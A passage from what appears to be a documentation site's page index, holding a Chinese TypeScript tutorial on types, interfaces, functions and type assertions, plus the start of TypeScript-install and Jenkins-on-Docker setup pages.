所以如果你的变量的声明和赋值时同时进行的，可以省略掉类型声明\n\n以下代码虽然没有指定类型，但是会在编译的时候报错：\n\n\nlet myfavoritenumber = 'seven';\nmyfavoritenumber = 7;\n\n// index.ts(2,1): error ts2322: type 'number' is not assignable to type 'string'.\n\n// 事实上，它等价于：\n\nlet myfavoritenumber: string = 'seven';\nmyfavoritenumber = 7;\n\n// index.ts(2,1): error ts2322: type 'number' is not assignable to type 'string'.\n\n\n如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查：\n\nlet myfavoritenumber;\nmyfavoritenumber = 'seven';\nmyfavoritenumber = 7;\n\n\n\n\n# 联合类型\n\n联合类型（union types）表示取值可以为多种类型中的一种。\n\nlet myfavoritenumber: string | number;\nmyfavoritenumber = 'seven';\nmyfavoritenumber = 7;\n\n\nlet myfavoritenumber: string | number;\nmyfavoritenumber = true;\n\n// index.ts(2,1): error ts2322: type 'boolean' is not assignable to type 'string | number'.\n//   type 'boolean' is not assignable to type 'number'.\n\n\n联合类型使用 | 分隔每个类型。\n\n这里的 let myfavoritenumber: string | number 的含义是，允许 myfavoritenumber 的类型是 string 或者 number，但是不能是其他类型。\n\n\n# 对象的类型——接口\n\n> 在 typescript 中，我们使用接口（interfaces）来定义对象的类型。\n\n在面向对象语言中，接口（interfaces）是一个很重要的概念，它是对行为的抽象，而具体如何行动需要由类（classes）去实现（implement）。\n\ninterface person {\n    name: string;\n    age: number;\n}\n\nlet tom: person = {\n    name: 'tom',\n    age: 25\n};\n\n\n上面的例子中，我们定义了一个接口 person，接着定义了一个变量 tom，它的类型是 person。这样，我们就约束了 tom 的形状必须和接口 person 一致。\n\n接口一般首字母大写。有的编程语言中会建议接口的名称加上 i 前缀。\n\n定义的变量比接口少了一些属性是不允许的：\n\n\ninterface person {\n    name: string;\n    age: number;\n}\n\nlet tom: person = {\n    name: 'tom'\n};\n\n// index.ts(6,5): error ts2322: type '{ name: string; }' is not assignable to type 'person'.\n//   property 'age' is missing in type '{ name: string; }'.\n\n\n\n多一些属性也是不允许的：\n\ninterface person {\n    name: string;\n    age: number;\n}\n\nlet tom: person = {\n    name: 'tom',\n    age: 25,\n    gender: 'male'\n};\n\n// index.ts(9,5): error ts2322: type '{ name: string; age: number; gender: string; }' is not assignable to type 'person'.\n//   object literal may only specify known properties, and 'gender' does not exist in type 'person'.\n\n\n\n# 可选属性\n\n> 有时我们希望不要完全匹配一个形状，那么可以用可选属性：\n\ninterface person {\n    name: string;\n    age?: number;\n}\n\nlet tom: person = {\n    name: 'tom'\n};\nlet tom: person = {\n    name: 'tom',\n    age: 25\n};\n// 可选属性的含义是该属性可以不存在。\n\n\n\n这时仍然不允许添加未定义的属性：\n\n  interface person {\n      name: string;\n      age?: number;\n  }\n\n  let tom: person = {\n      name: 'tom',\n      age: 25,\n      gender: 'male'\n  };\n\n  // examples/playground/index.ts(9,5): error ts2322: type '{ name: string; age: number; gender: string; }' is not assignable to type 'person'.\n  //   object literal may only specify known properties, and 'gender' does not exist in type 'person'.\n\n\n\n# 任意属性\n\n有时候我们希望一个接口允许有任意的属性，可以使用如下方式：\n\ninterface person {\n    name: string;\n    age?: number;\n    [propname: string]: any;\n}\n\nlet tom: person = {\n    name: 'tom',\n    gender: 'male'\n};\n\n\n使用 [propname: string] 定义了任意属性取 string 类型的值。\n\n需要注意的是，一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集：\n\n\ninterface person {\n    name: string;\n    age?: number;\n    [propname: string]: string;\n}\n\nlet tom: person = {\n    name: 'tom',\n    age: 25,\n    gender: 'male'\n};\n\n// index.ts(3,5): error ts2411: property 'age' of type 'number' is not assignable to string index type 'string'.\n// index.ts(7,5): error ts2322: type '{ [x: string]: string | number; name: string; age: number; gender: string; }' is not assignable to type 'person'.\n//   index signatures are incompatible.\n//     type 'string | number' is not assignable to type 'string'.\n//       type 'number' is not assignable to type 'string'.\n// 上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number 不是 string 的子属性，所以报错了。\n\n// 另外，在报错信息中可以看出，此时 { name: 'tom', age: 25, gender: 'male' } 的类型被推断成了 { [x: string]: string | number; name: string; age: number; gender: string; }，这是联合类型和接口的结合。\n\n\n\n一个接口中只能定义一个任意属性。如果接口中有多个类型的属性，则可以在任意属性中使用联合类型：\n\ninterface person {\n    name: string;\n    age?: number;\n    [propname: string]: string | number;\n}\n\nlet tom: person = {\n    name: 'tom',\n    age: 25,\n    gender: 'male'\n};\n\n\n\n有时候我们希望对象中的一些字段只能在创建的时候被赋值，那么可以用 readonly 定义只读属性：\n\n\ninterface person {\n    readonly id: number;\n    name: string;\n    age?: number;\n    [propname: string]: any;\n}\n\nlet tom: person = {\n    id: 89757,\n    name: 'tom',\n    gender: 'male'\n};\n\ntom.id = 9527;\n\n// index.ts(14,5): error ts2540: cannot assign to 'id' because it is a constant or a read-only property.\n\n\n上例中，使用 readonly 定义的属性 id 初始化后，又被赋值了，所以报错了。\n\n注意，只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候：\n\ninterface person {\n    readonly id: number;\n    name: string;\n    age?: number;\n    [propname: string]: any;\n}\n\nlet tom: person = {\n    name: 'tom',\n    gender: 'male'\n};\n\ntom.id = 89757;\n\n// index.ts(8,5): error ts2322: type '{ name: string; gender: string; }' is not assignable to type 'person'.\n//   property 'id' is missing in type '{ name: string; gender: string; }'.\n// index.ts(13,5): error ts2540: cannot assign to 'id' because it is a constant or a read-only property.\n\n\n上例中，报错信息有两处，第一处是在对 tom 进行赋值的时候，没有给 id 赋值。\n\n第二处是在给 tom.id 赋值的时候，由于它是只读属性，所以报错了。\n\n\n# 数组的类型\n\n\n# 「类型 + 方括号」表示法§\n\n最简单的方法是使用「类型 + 方括号」来表示数组：\n\n\nlet fibonacci: number[] = [1, 1, 2, 3, 5];\n\n// 数组的项中不允许出现其他的类型：\n\nlet fibonacci: number[] = [1, '1', 2, 3, 5]; // type 'string' is not assignable to type 'number'.\n\n\n\n\n数组的一些方法的参数也会根据数组在定义时约定的类型进行限制：\n\nlet fibonacci: number[] = [1, 1, 2, 3, 5];\nfibonacci.push('8');\n\n// argument of type '\"8\"' is not assignable to parameter of type 'number'.\n// 上例中，push 方法只允许传入 number 类型的参数，但是却传了一个 \"8\" 类型的参数，所以报错了\n\n\n\n# 数组泛型\n\n我们也可以使用数组泛型（array generic） array<elemtype> 来表示数组：\n\nlet fibonacci: array<number> = [1, 1, 2, 3, 5];\n\n\n\n# 用接口表示数组\n\n接口也可以用来描述数组：\n\ninterface numberarray {\n    [index: number]: number;\n}\nlet fibonacci: numberarray = [1, 1, 2, 3, 5];\n\n\nnumberarray 表示：只要索引的类型是数字时，那么值的类型必须是数字。\n\n虽然接口也可以用来描述数组，但是我们一般不会这么做，因为这种方式比前两种方式复杂多了。\n\n不过有一种情况例外，那就是它常用来表示类数组。\n\n\n# 类数组\n\n类数组（array-like object）不是数组类型，比如 arguments：\n\nfunction sum() {\n    let args: number[] = arguments;\n}\n\n// type 'iarguments' is missing the following properties from type 'number[]': pop, push, concat, join, and 24 more.\n\n\n上例中，arguments 实际上是一个类数组，不能用普通的数组的方式来描述，而应该用接口：\n\nfunction sum() {\n    let args: {\n        [index: number]: number;\n        length: number;\n        callee: function;\n    } = arguments;\n}\n\n\n> 在这个例子中，我们除了约束当索引的类型是数字时，值的类型必须是数字之外，也约束了它还有 length 和 callee 两个属性。\n\n事实上常用的类数组都有自己的接口定义，如 iarguments, nodelist, htmlcollection 等：\n\nfunction sum() {\n    let args: iarguments = arguments;\n}\n\n\n其中 iarguments 是 typescript 中定义好了的类型，它实际上就是：\n\ninterface iarguments {\n    [index: number]: any;\n    length: number;\n    callee: function;\n}\n\n\n\n# any 在数组中的应用\n\n一个比较常见的做法是，用 any 表示数组中允许出现任意类型：\n\nlet list: any[] = ['xcatliu', 25, { website: 'http://xcatliu.com' }];\n\n\n\n\n# 函数的类型\n\n\n# 函数声明\n\n在 javascript 中，有两种常见的定义函数的方式——函数声明（function declaration）和函数表达式（function expression）：\n\n// 函数声明（function declaration）\nfunction sum(x, y) {\n    return x + y;\n}\n\n// 函数表达式（function expression）\nlet mysum = function (x, y) {\n    return x + y;\n};\n\n\n一个函数有输入和输出，要在 typescript 中对其进行约束，需要把输入和输出都考虑到，其中函数声明的类型定义较简单：\n\n\nfunction sum(x: number, y: number): number {\n    return x + y;\n}\n\n\n注意，输入多余的（或者少于要求的）参数，是不被允许的：\n\nfunction sum(x: number, y: number): number {\n    return x + y;\n}\nsum(1, 2, 3);\n\n// index.ts(4,1): error ts2346: supplied parameters do not match any signature of call target.\nfunction sum(x: number, y: number): number {\n    return x + y;\n}\nsum(1);\n\n// index.ts(4,1): error ts2346: supplied parameters do not match any signature of call target.\n\n\n\n# 函数表达式\n\n如果要我们现在写一个对函数表达式（function expression）的定义，可能会写成这样：\n\nlet mysum = function (x: number, y: number): number {\n    return x + y;\n};\n\n\n这是可以通过编译的，不过事实上，上面的代码只对等号右侧的匿名函数进行了类型定义，而等号左边的 mysum，是通过赋值操作进行类型推论而推断出来的。如果需要我们手动给 mysum 添加类型，则应该是这样：\n\nlet mysum: (x: number, y: number) => number = function (x: number, y: number): number {\n  return x + y;\n};\n}\n\n\n\n\n# 用接口定义函数的形状\n\n我们也可以使用接口的方式来定义一个函数需要符合的形状：\n\ninterface searchfunc {\n    (source: string, substring: string): boolean;\n}\n\nlet mysearch: searchfunc;\nmysearch = function(source: string, substring: string) {\n    return source.search(substring) !== -1;\n}\n\n\n采用函数表达式|接口定义函数的方式时，对等号左侧进行类型限制，可以保证以后对函数名赋值时保证参数个数、参数类型、返回值类型不变。\n\n\n# 可选参数\n\n前面提到，输入多余的（或者少于要求的）参数，是不允许的。那么如何定义可选的参数呢？\n\n与接口中的可选属性类似，我们用 ? 表示可选的参数：\n\n\nfunction buildname(firstname: string, lastname?: string) {\n    if (lastname) {\n        return firstname + ' ' + lastname;\n    } else {\n        return firstname;\n    }\n}\nlet tomcat = buildname('tom', 'cat');\nlet tom = buildname('tom');\n\n\n需要注意的是，可选参数必须接在必需参数后面。换句话说，可选参数后面不允许再出现必需参数了\n\nfunction buildname(firstname?: string, lastname: string) {\n    if (firstname) {\n        return firstname + ' ' + lastname;\n    } else {\n        return lastname;\n    }\n}\nlet tomcat = buildname('tom', 'cat');\nlet tom = buildname(undefined, 'tom');\n\n// index.ts(1,40): error ts1016: a required parameter cannot follow an optional parameter.\n\n\n\n\n# 参数默认值\n\n在 es6 中，我们允许给函数的参数添加默认值，typescript 会将添加了默认值的参数识别为可选参数\n\nfunction buildname(firstname: string, lastname: string = 'cat') {\n    return firstname + ' ' + lastname;\n}\nlet tomcat = buildname('tom', 'cat');\nlet tom = buildname('tom');\n// 此时就不受「可选参数必须接在必需参数后面」的限制了：\nfunction buildname(firstname: string = 'tom', lastname: string) {\n    return firstname + ' ' + lastname;\n}\nlet tomcat = buildname('tom', 'cat');\nlet cat = buildname(undefined, 'cat');\n\n\n\n\n# 剩余参数\n\nes6 中，可以使用 ...rest 的方式获取函数中的剩余参数（rest 参数）：\n\nfunction push(array, ...items) {\n    items.foreach(function(item) {\n        array.push(item);\n    });\n}\n\nlet a: any[] = [];\npush(a, 1, 2, 3);\n\n\n事实上，items 是一个数组。所以我们可以用数组的类型来定义它：\n\nfunction push(array: any[], ...items: any[]) {\n    items.foreach(function(item) {\n        array.push(item);\n    });\n}\nlet a = [];\npush(a, 1, 2, 3);\n\n\n\n\n# 重载\n\n重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。\n\n比如，我们需要实现一个函数 reverse，输入数字 123 的时候，输出反转的数字 321，输入字符串 'hello' 的时候，输出反转的字符串 'olleh'。\n\n利用联合类型，我们可以这么实现：\n\nfunction reverse(x: number | string): number | string | void {\n    if (typeof x === 'number') {\n        return number(x.tostring().split('').reverse().join(''));\n    } else if (typeof x === 'string') {\n        return x.split('').reverse().join('');\n    }\n}\n\n\n然而这样有一个缺点，就是不能够精确的表达，输入为数字的时候，输出也应该为数字，输入为字符串的时候，输出也应该为字符串。\n\n这时，我们可以使用重载定义多个 reverse 的函数类型：\n\nfunction reverse(x: number): number;\nfunction reverse(x: string): string;\nfunction reverse(x: number | string): number | string | void {\n    if (typeof x === 'number') {\n        return number(x.tostring().split('').reverse().join(''));\n    } else if (typeof x === 'string') {\n        return x.split('').reverse().join('');\n    }\n}\n\n\n\n# 类型断言\n\n> 有些情况下，变量的类型对于我们来说是很明确，但是ts编译器却并不清楚，此时，可以通过类型断言来告诉编译器变量的类型，断言有两种形式：\n\n\n# 语法\n\n * 第一种 值 as 类型\n\n  let somevalue: unknown = \"this is a string\";\n  let strlength: number = (somevalue as string).length;\n\n\n * 第二种 <类型>值\n\nlet somevalue: unknown = \"this is a string\";\nlet strlength: number = (<string>somevalue).length;\n\n\n> 在 tsx 语法（react 的 jsx 语法的 ts 版）中必须使用前者，即 值 as 类型。\n\n形如 <foo> 的语法在 tsx 中表示的是一个 reactnode，在 ts 中除了表示类型断言之外，也可能是表示一个泛型。\n\n\n# 类型断言的用途\n\n将一个联合类型断言为其中一个类型\n\n> typescript 不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的所有类型中共有的属性或方法\n\n\n# 类型断言的限制\n\n> 当前断言总结\n\n * 联合类型可以被断言为其中一个类型\n * 父类可以被断言为子类\n * 任何类型都可以被断言为 any\n * any 可以被断言为任何类型\n\n类型断言的限制：\n\ninterface animal {\n    name: string;\n}\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nlet tom: cat = {\n    name: 'tom',\n    run: () => { console.log('run') }\n};\nlet animal: animal = tom;\n\n\n我们知道，typescript 是结构类型系统，类型之间的对比只会比较它们最终的结构，而会忽略它们定义时的关系。\n\n在上面的例子中，cat 包含了 animal 中的所有属性，除此之外，它还有一个额外的方法 run。typescript 并不关心 cat 和 animal 之间定义时是什么关系，而只会看它们最终的结构有什么关系——所以它与 cat extends animal 是等价的：\n\ninterface animal {\n    name: string;\n}\ninterface cat extends animal {\n    run(): void;\n}\n\n\n那么也不难理解为什么 cat 类型的 tom 可以赋值给 animal 类型的 animal 了——就像面向对象编程中我们可以将子类的实例赋值给类型为父类的变量。\n\n我们把它换成 typescript 中更专业的说法，即：animal 兼容 cat。\n\n当 animal 兼容 cat 时，它们就可以互相进行类型断言了：\n\ninterface animal {\n    name: string;\n}\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nfunction testanimal(animal: animal) {\n    return (animal as cat);\n}\nfunction testcat(cat: cat) {\n    return (cat as animal);\n}\n\n\n这样的设计其实也很容易就能理解：\n\n * 允许 animal as cat 是因为「父类可以被断言为子类」，这个前面已经学习过了\n * 允许 cat as animal 是因为既然子类拥有父类的属性和方法，那么被断言为父类，获取父类的属性、调用父类的方法，就不会有任何问题，故「子类可以被断言为父类」 需要注意的是，这里我们使用了简化的父类子类的关系来表达类型的兼容性，而实际上 typescript 在判断类型的兼容性时，比这种情况复杂很多，详细请参考[类型的兼容性（todo)][]章节。\n\n总之，若 a 兼容 b，那么 a 能够被断言为 b，b 也能被断言为 a。\n\n同理，若 b 兼容 a，那么 a 能够被断言为 b，b 也能被断言为 a。\n\n所以这也可以换一种说法：\n\n要使得 a 能够被断言为 b，只需要 a 兼容 b 或 b 兼容 a 即可，这也是为了在类型断言时的安全考虑，毕竟毫无根据的断言是非常危险的。\n\n综上所述：\n\n * 联合类型可以被断言为其中一个类型\n * 父类可以被断言为子类\n * 任何类型都可以被断言为 any\n * any 可以被断言为任何类型\n * 要使得 a 能够被断言为 b，只需要 a 兼容 b 或 b 兼容 a 即可 其实前四种情况都是最后一个的特例。\n\n\n# 双重断言\n\n既然：\n\n * 任何类型都可以被断言为 any\n * any 可以被断言为任何类型 那么我们是不是可以使用双重断言 as any as foo 来将任何一个类型断言为任何另一个类型呢？\n\ninterface cat {\n    run(): void;\n}\ninterface fish {\n    swim(): void;\n}\n\nfunction testcat(cat: cat) {\n    return (cat as any as fish);\n}\n\n\n在上面的例子中，若直接使用 cat as fish 肯定会报错，因为 cat 和 fish 互相都不兼容。\n\n但是若使用双重断言，则可以打破「要使得 a 能够被断言为 b，只需要 a 兼容 b 或 b 兼容 a 即可」的限制，将任何一个类型断言为任何另一个类型。\n\n若你使用了这种双重断言，那么十有八九是非常错误的，它很可能会导致运行时错误。\n\n除非迫不得已，千万别用双重断言\n\n\n# 类型断言 vs 类型转换\n\n> 类型断言只会影响 typescript 编译时的类型，类型断言语句在编译结果中会被删除：\n\n\n类型断言只会影响 typescript 编译时的类型，类型断言语句在编译结果中会被删除：\n\nfunction toboolean(something: any): boolean {\n    return something as boolean;\n}\n\ntoboolean(1);\n// 返回值为 1\n在上面的例子中，将 something 断言为 boolean 虽然可以通过编译，但是并没有什么用，代码在编译后会变成：\n\nfunction toboolean(something) {\n    return something;\n}\n\ntoboolean(1);\n// 返回值为 1\n所以类型断言不是类型转换，它不会真的影响到变量的类型。\n\n若要进行类型转换，需要直接调用类型转换的方法：\n\nfunction toboolean(something: any): boolean {\n    return boolean(something);\n}\n\ntoboolean(1);\n// 返回值为 true\n\n\n\n# 类型断言 vs 类型声明\n\n在这个例子中：\n\nfunction getcachedata(key: string): any {\n    return (window as any).cache[key];\n}\n\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nconst tom = getcachedata('tom') as cat;\ntom.run();\n\n\n我们使用 as cat 将 any 类型断言为了 cat 类型。\n\n但实际上还有其他方式可以解决这个问题：\n\nfunction getcachedata(key: string): any {\n    return (window as any).cache[key];\n}\n\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nconst tom: cat = getcachedata('tom');\ntom.run();\n\n\n上面的例子中，我们通过类型声明的方式，将 tom 声明为 cat，然后再将 any 类型的 getcachedata('tom') 赋值给 cat 类型的 tom。\n\n这和类型断言是非常相似的，而且产生的结果也几乎是一样的——tom 在接下来的代码中都变成了 cat 类型。\n\n它们的区别，可以通过这个例子来理解：\n\ninterface animal {\n    name: string;\n}\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nconst animal: animal = {\n    name: 'tom'\n};\nlet tom = animal as cat;\n\n\n在上面的例子中，由于 animal 兼容 cat，故可以将 animal 断言为 cat 赋值给 tom。\n\n但是若直接声明 tom 为 cat 类型：\n\ninterface animal {\n    name: string;\n}\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nconst animal: animal = {\n    name: 'tom'\n};\nlet tom: cat = animal;\n\n// index.ts:12:5 - error ts2741: property 'run' is missing in type 'animal' but required in type 'cat'.\n\n\n则会报错，不允许将 animal 赋值为 cat 类型的 tom。\n\n这很容易理解，animal 可以看作是 cat 的父类，当然不能将父类的实例赋值给类型为子类的变量。\n\n深入的讲，它们的核心区别就在于：\n\n * animal 断言为 cat，只需要满足 animal 兼容 cat 或 cat 兼容 animal 即可\n * animal 赋值给 tom，需要满足 cat 兼容 animal 才行 但是 cat 并不兼容 animal。\n\n而在前一个例子中，由于 getcachedata('tom') 是 any 类型，any 兼容 cat，cat 也兼容 any，故\n\nconst tom = getcachedata('tom') as cat;\n// 等价于\nconst tom: cat = getcachedata('tom');\n\n\n知道了它们的核心区别，就知道了类型声明是比类型断言更加严格的。\n\n所以为了增加代码的质量，我们最好优先使用类型声明，这也比类型断言的 as 语法更加优雅。\n\n\n# 类型断言 vs 泛型\n\nfunction getcachedata(key: string): any {\n    return (window as any).cache[key];\n}\n\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nconst tom = getcachedata('tom') as cat;\ntom.run();\n\n\n我们还有第三种方式可以解决这个问题，那就是泛型：\n\nfunction getcachedata<t>(key: string): t {\n    return (window as any).cache[key];\n}\n\ninterface cat {\n    name: string;\n    run(): void;\n}\n\nconst tom = getcachedata<cat>('tom');\ntom.run();\n\n\n\n通过给 getcachedata 函数添加了一个泛型 <t>，我们可以更加规范的实现对 getcachedata 返回值的约束，这也同时去除掉了代码中的 any，是最优的一个解决方案。\n\n\n# 声明文件\n\n> 当使用第三方库时，我们需要引用它的声明文件，才能获得对应的代码补全、接口提示等功能。\n\n\n# 新语法\n\n * declare var 声明全局变量\n * eclare function 声明全局方法\n * eclare class 声明全局类\n * eclare enum 声明全局枚举类型\n * eclare namespace 声明（含有子属性的）全局对象\n * nterface 和 type 声明全局类型\n * xport 导出变量\n * xport namespace 导出（含有子属性的）对象\n * xport default es6 默认导出\n * xport = commonjs 导出模块\n * xport as namespace umd 库声明全局变量\n * eclare global 扩展全局变量\n * eclare module 扩展模块\n * // 三斜线指令\n\n * unknown\n   \n   let notsure: unknown = 4;\n   notsure = 'hello';\n   \n\n * never\n   \n   function error(message: string): never {\n    throw new error(message);\n   }\n   \n\n * object（没啥用）\n   \n   let obj: object = {};\n   \n\n * array\n   \n   let list: number[] = [1, 2, 3];\n   let list: array<number> = [1, 2, 3];\n   \n\n * tuple\n   \n   let x: [string, number];\n   x = [\"hello\", 10]; \n   \n\n * enum\n   \n   enum color {\n    red,\n    green,\n    blue,\n   }\n   let c: color = color.green;\n   \n   enum color {\n    red = 1,\n    green,\n    blue,\n   }\n   let c: color = color.green;\n   \n   enum color {\n    red = 1,\n    green = 2,\n    blue = 4,\n   }\n   let c: color = color.green;\n   ",charsets:{cjk:!0}},{title:"TypeScript简介",frontmatter:{},regularPath:"/Javascript/TypeScript%E5%85%A5%E9%97%A8/01-%E7%AE%80%E4%BB%8B.html",relativePath:"Javascript/TypeScript入门/01-简介.md",key:"v-01ad37c1",path:"/Javascript/TypeScript%E5%85%A5%E9%97%A8/01-%E7%AE%80%E4%BB%8B.html",headers:[{level:2,title:"TypeScript简介",slug:"typescript简介",normalizedTitle:"typescript简介",charIndex:2},{level:2,title:"为什么会有 TypeScript?",slug:"为什么会有-typescript",normalizedTitle:"为什么会有 typescript?",charIndex:134},{level:2,title:"安装TypeScript",slug:"安装typescript",normalizedTitle:"安装typescript",charIndex:734},{level:2,title:"ts-node",slug:"ts-node",normalizedTitle:"ts-node",charIndex:986},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:1178}],headersStr:"TypeScript简介 为什么会有 TypeScript? 安装TypeScript ts-node 参考",content:"# TypeScript简介\n\n> TypeScript是添加了类型系统的 JavaScript，适用于任何规模的项目。\n\n以上描述是官网对于 TypeScript 的定义。\n\n它强调了 TypeScript 的两个最重要的特性——类型系统、适用于任何规模。\n\n\n# 为什么会有 TypeScript?\n\nJavaScript 只是一个脚本语言，并非设计用于开发大型 Web 应用，JavaScript 没有提供类和模块的概念，而 TypeScript 扩展了 JavaScript 实现了这些特性。TypeScript 主要特点包括：\n\n * TypeScript 是添加了类型系统的 JavaScript，适用于任何规模的项目。\n * TypeScript 是一门静态类型、弱类型的语言。\n * TypeScript 是完全兼容 JavaScript 的，它不会修改 JavaScript 运行时的特性。\n * TypeScript 可以编译为 JavaScript，然后运行在浏览器、Node.js 等任何能运行 JavaScript 的环境中。\n * TypeScript 拥有很多编译选项，类型检查的严格程度由你决定。\n * TypeScript 可以和 JavaScript 共存，这意味着 JavaScript 项目能够渐进式的迁移到 -TypeScript。\n * TypeScript 增强了编辑器（IDE）的功能，提供了代码补全、接口提示、跳转到定义、代码重构等能力。\n * TypeScript 拥有活跃的社区，大多数常用的第三方库都提供了类型声明。\n * TypeScript 与标准同步发展，符合最新的 ECMAScript 标准。\n\n\n# 安装TypeScript\n\nTypeScript 的命令行工具安装方法如下：\n\nnpm install -g typescript\n\n\n\n以上命令会在全局环境下安装 tsc 命令，安装完成之后，我们就可以在任何地方执行 tsc 命令了。\n\n编译一个 TypeScript 文件很简单：\n\ntsc -v\ntsc test.ts\n\n\n\n在监视模式下运行编译器\n\ntsc test.ts --watch\ntsc test.ts -w\n\n\n在监视模式下运行编译器。会监视输出文件，在它们改变时重新编译。\n\n\n# ts-node\n\nnpm 全局安装即可。\n\n简单的说就是它提供了TypeScript的运行环境，让我们免去了麻烦的编译这一步骤。最简单的例子，在注册ts-node之后，我们就可以直接加载并运行ts文件\n\nrequire('ts-node').register();\n\n// 这样就能直接加载并运行 ./ts-code.ts...\nrequire('./ts-code');\n\n\n\n# 参考\n\n * TypeScript 入门教程\n * 深入理解 TypeScript",normalizedContent:"# typescript简介\n\n> typescript是添加了类型系统的 javascript，适用于任何规模的项目。\n\n以上描述是官网对于 typescript 的定义。\n\n它强调了 typescript 的两个最重要的特性——类型系统、适用于任何规模。\n\n\n# 为什么会有 typescript?\n\njavascript 只是一个脚本语言，并非设计用于开发大型 web 应用，javascript 没有提供类和模块的概念，而 typescript 扩展了 javascript 实现了这些特性。typescript 主要特点包括：\n\n * typescript 是添加了类型系统的 javascript，适用于任何规模的项目。\n * typescript 是一门静态类型、弱类型的语言。\n * typescript 是完全兼容 javascript 的，它不会修改 javascript 运行时的特性。\n * typescript 可以编译为 javascript，然后运行在浏览器、node.js 等任何能运行 javascript 的环境中。\n * typescript 拥有很多编译选项，类型检查的严格程度由你决定。\n * typescript 可以和 javascript 共存，这意味着 javascript 项目能够渐进式的迁移到 -typescript。\n * typescript 增强了编辑器（ide）的功能，提供了代码补全、接口提示、跳转到定义、代码重构等能力。\n * typescript 拥有活跃的社区，大多数常用的第三方库都提供了类型声明。\n * typescript 与标准同步发展，符合最新的 ecmascript 标准。\n\n\n# 安装typescript\n\ntypescript 的命令行工具安装方法如下：\n\nnpm install -g typescript\n\n\n\n以上命令会在全局环境下安装 tsc 命令，安装完成之后，我们就可以在任何地方执行 tsc 命令了。\n\n编译一个 typescript 文件很简单：\n\ntsc -v\ntsc test.ts\n\n\n\n在监视模式下运行编译器\n\ntsc test.ts --watch\ntsc test.ts -w\n\n\n在监视模式下运行编译器。会监视输出文件，在它们改变时重新编译。\n\n\n# ts-node\n\nnpm 全局安装即可。\n\n简单的说就是它提供了typescript的运行环境，让我们免去了麻烦的编译这一步骤。最简单的例子，在注册ts-node之后，我们就可以直接加载并运行ts文件\n\nrequire('ts-node').register();\n\n// 这样就能直接加载并运行 ./ts-code.ts...\nrequire('./ts-code');\n\n\n\n# 参考\n\n * typescript 入门教程\n * 深入理解 typescript",charsets:{cjk:!0}},{title:"Jenkins",frontmatter:{},regularPath:"/Jenkins/",relativePath:"Jenkins/README.md",key:"v-b704c824",path:"/Jenkins/",headers:[{level:2,title:"Jenkins 主要作用",slug:"jenkins-主要作用",normalizedTitle:"jenkins 主要作用",charIndex:115},{level:2,title:"Jenkins 安装",slug:"jenkins-安装",normalizedTitle:"jenkins 安装",charIndex:173},{level:3,title:"机器要求：",slug:"机器要求",normalizedTitle:"机器要求：",charIndex:188},{level:3,title:"需要安装以下软件：",slug:"需要安装以下软件",normalizedTitle:"需要安装以下软件：",charIndex:263},{level:3,title:"基于docker 安装并启动",slug:"基于docker-安装并启动",normalizedTitle:"基于docker 安装并启动",charIndex:326},{level:2,title:"Jenkins 配置",slug:"jenkins-配置",normalizedTitle:"jenkins 配置",charIndex:695},{level:2,title:"安装插件 并 创建用户",slug:"安装插件-并-创建用户",normalizedTitle:"安装插件 并 创建用户",charIndex:873},{level:2,title:"配置  nodejs ssh gitee 插件。",slug:"配置-nodejs-ssh-gitee-插件。",normalizedTitle:"配置  nodejs ssh gitee 插件。",charIndex:null},{level:3,title:"nodejs安装",slug:"nodejs安装",normalizedTitle:"nodejs安装",charIndex:1120},{level:3,title:"配置nodejs",slug:"配置nodejs",normalizedTitle:"配置nodejs",charIndex:1178},{level:3,title:"ssh安装",slug:"ssh安装",normalizedTitle:"ssh安装",charIndex:1280},{level:3,title:"ssh配置",slug:"ssh配置",normalizedTitle:"ssh配置",charIndex:1372},{level:3,title:"gitee安装",slug:"gitee安装",normalizedTitle:"gitee安装",charIndex:1449},{level:3,title:"gitee配置密钥",slug:"gitee配置密钥",normalizedTitle:"gitee配置密钥",charIndex:1472},{level:2,title:"新建任务",slug:"新建任务",normalizedTitle:"新建任务",charIndex:2223}],headersStr:"Jenkins 主要作用 Jenkins 安装 机器要求： 需要安装以下软件： 基于docker 安装并启动 Jenkins 配置 安装插件 并 创建用户 配置  nodejs ssh gitee 插件。 nodejs安装 配置nodejs ssh安装 ssh配置 gitee安装 gitee配置密钥 新建任务",content:"# Jenkins\n\n\n\n> Jenkins是一款开源 CI&CD 软件，用于自动化各种任务，包括构建、测试和部署软件。 Jenkins 支持各种运行方式，可通过系统包、Docker 或者通过一个独立的 Java 程序。\n\n\n# Jenkins 主要作用\n\n * l 持续、自动地构建/测试软件项目。\n * l 监控一些定时执行的任务。\n\n\n# Jenkins 安装\n\n\n# 机器要求：\n\n * 256 MB 内存，建议大于 512 MB\n * 10 GB 的硬盘空间（用于 Jenkins 和 Docker 镜像）\n\n\n# 需要安装以下软件：\n\n * Java 8 ( JRE 或者 JDK 都可以)\n * Docker dockerhub\n\n\n# 基于docker 安装并启动\n\ndocker命令\n\njenkins/jenkins:lts 这个版本是长期维护的。\n\n安装docker后直接运行此命令即可，没有安装镜像会自动安装并启动。\n\n卷挂载的/home/datajenkins 可自定义\n\nJenkins的配置目录默认在 /var/jenkins_home\n\n暴露Jenkins默认8080端口给宿主机\n\n\n\n \n\n\n\n\ndocker run -id --name jenkins -p 8080:8080 -v /home/data/jenkins:/var/jenkins_home jenkins/jenkins:lts\n\n\n\n> 如果发现jenkins 镜像未启动，但是以存在。可能是文件权限的问题 chown -R 1000 /home/data/jenkins\n\n\n# Jenkins 配置\n\n\n\nTIP\n\n此时 docker 的 Jenkins 的镜像已经启动。\n\n可以访问 一下8080端口测试一下。\n\n> 使用docker logs Jenkins 或 进入Jenkins 镜像的目录中 查看下图路径。 cat /var/lib/jenkins/secrets/initialAdminPassword\n\n\n\n\n\n\n# 安装插件 并 